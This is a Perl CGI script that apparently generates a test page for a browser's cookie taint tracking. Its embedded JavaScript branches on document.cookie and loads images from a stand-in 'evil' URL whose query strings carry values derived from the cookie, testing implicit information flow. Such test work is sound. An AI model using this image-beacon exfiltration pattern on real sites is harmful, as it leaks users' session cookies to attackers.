#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_PUSHOBJ";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;

		// shouldn't be evil 

		function test() {return notevil;};
		var dut = test();

		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		function test2() {return notevil2;};
		if ($evil) {
			var dut2 = test2();
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		if ($evil) {
			function test3() {return notevil3;};
		}
		var dut3 = test3();
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
